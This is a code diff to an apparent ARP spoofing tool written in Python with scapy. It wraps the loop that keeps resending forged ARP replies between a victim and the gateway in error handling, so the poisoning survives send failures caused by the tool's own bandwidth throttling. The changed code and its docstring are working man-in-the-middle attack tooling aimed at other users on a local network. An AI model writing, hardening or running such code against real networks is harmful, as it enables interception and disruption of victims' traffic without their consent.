@@ -17,7 +17,7 @@ import time
 from scapy.all import ARP, Ether, sendp
 
 import config
-from utils.logger import log_info, log_ok, log_err
+from utils.logger import log_info, log_ok, log_err, log_warn
 from utils.network_utils import get_mac
 
 
@@ -83,10 +83,21 @@ class SpoofSession:
         Loop that runs on a dedicated thread: resends the ARP poison in
         both directions (victim<->gateway) every `config.POISON_INTERVAL`
         seconds, until `stop_event` is set from outside.
+
+        Send failures are caught and logged instead of left to kill the
+        thread: a low --bandwidth (tc tbf shapes the WHOLE interface,
+        not just the victim's traffic) can throttle our own outgoing
+        ARP packets enough to raise OSError (ENOBUFS) here. Without
+        this, that one failed send would silently end the poisoning for
+        this victim — no crash, no message, just a session that quietly
+        stops doing anything.
         """
         while not self.stop_event.is_set():
-            send_fake_arp(self.target_ip, self.target_mac, self.gateway_ip, self.interface)
-            send_fake_arp(self.gateway_ip, self.gateway_mac, self.target_ip, self.interface)
+            try:
+                send_fake_arp(self.target_ip, self.target_mac, self.gateway_ip, self.interface)
+                send_fake_arp(self.gateway_ip, self.gateway_mac, self.target_ip, self.interface)
+            except Exception as e:
+                log_warn(f"[{self.target_ip}] Poison packet send failed, will retry: {e}")
             time.sleep(config.POISON_INTERVAL)
 
     def start(self):
